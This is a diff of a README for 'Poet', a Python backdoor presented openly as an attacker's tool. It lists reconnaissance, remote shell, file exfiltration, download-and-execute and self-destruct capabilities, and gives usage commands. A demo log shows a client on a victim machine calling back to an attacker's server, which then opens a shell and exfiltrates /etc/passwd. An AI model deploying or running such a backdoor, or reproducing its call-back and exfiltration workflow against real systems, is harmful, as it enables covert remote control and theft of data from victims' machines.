@@ -11,26 +11,69 @@ tries again at the next interval. If the server is running however, the
 attacker gets a control shell to control the client and perform various actions
 on the target including:
 
-- reconaissance
-- basic shell
+- reconnaissance
+- remote shell
 - file exfiltration
 - download and execute
 - self destruct
 
+## usage
+
+Poet is super easy to use, and requires nothing more than the Python (2.7)
+standard library. To easily try it out, a typical invocation would look like:
+
+Terminal 1:
+
+```
+$ ./client.py -v 127.0.0.1 1
+```
+
+Terminal 2:
+
+```
+$ sudo ./server.py
+```
+
+Of course, using the `-h` flag gives you the full usage.
+
+```
+$ ./client.py -h
+usage: client.py [-h] [-p PORT] [-v] [-d] IP INTERVAL
+
+positional arguments:
+  IP                    server
+  INTERVAL              (s)
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -p PORT, --port PORT
+  -v, --verbose
+  -d, --delete          delete client upon execution
+
+$ ./server.py -h
+usage: server.py [-h] [-p PORT]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -p PORT, --port PORT
+```
+
 ## demo
 
-The attacker has gotten access to the victim's machine and downloaded and
-executed the client (in verbose mode ;). He/she does not have the server
-running at this point, but it's ok, the client waits patiently. Eventually the
-attacker is ready and starts the server, first starting a shell and executing
-`uname -a`, then exfiltrating `/etc/passwd`. Then he/she exits and detaches
-from the client, which continues running on the target waiting for the next
-opportunity to connect to the server.
+This is just a small sample of what poet can do.
+
+The scenario is, an attacker has gotten access to the victim's machine and
+downloaded and executed the client (in verbose mode ;).  He/she does not have
+the server running at this point, but it's ok, the client waits patiently.
+Eventually the attacker is ready and starts the server, first starting a shell
+and executing `uname -a`, then exfiltrating `/etc/passwd`. Then he/she exits
+and detaches from the client, which continues running on the target waiting for
+the next opportunity to connect to the server.
 
 Victim's Machine (5.4.3.2):
 
 ```
-$ ./client.py 1.2.3.4 10 -v
+$ ./client.py -v 1.2.3.4 10
 [+] Poet started with delay of 10 seconds to port 443. Ctrl-c to exit.
 [!] (2014-09-06 02:07:03.058921) Server is inactive
 [!] (2014-09-06 02:07:13.060840) Server is inactive
@@ -46,7 +89,7 @@ Attacker's Machine (1.2.3.4):
 ```
 # ./server.py
 [+] Poet server started on 443.
-[i] Connected By: ('5.4.3.2', 62209) at 2014-09-06 02:07:43.066092
+[i] (2014-09-06 02:07:43.066092) Connected By: ('5.4.3.2', 62209)
 [+] (2014-09-06 02:07:43.066531) Entering control shell
 Welcome to psh, the poet shell!
 Running `help' will give you a list of supported commands.
@@ -58,14 +101,15 @@ psh > exfil /etc/passwd
 psh : exfil written to archive/20140906/exfil/passwd
 psh > help
 Commands:
+  chint
+  dlexec
+  exec
+  exfil
   exit
   help
-  exec
   recon
-  shell
-  exfil
   selfdestruct
-  dlexec
+  shell
 psh > exit
 [+] (2014-09-06 02:08:40.401181) Exiting control shell.
 [-] (2014-09-06 02:08:40.401328) Poet terminated.
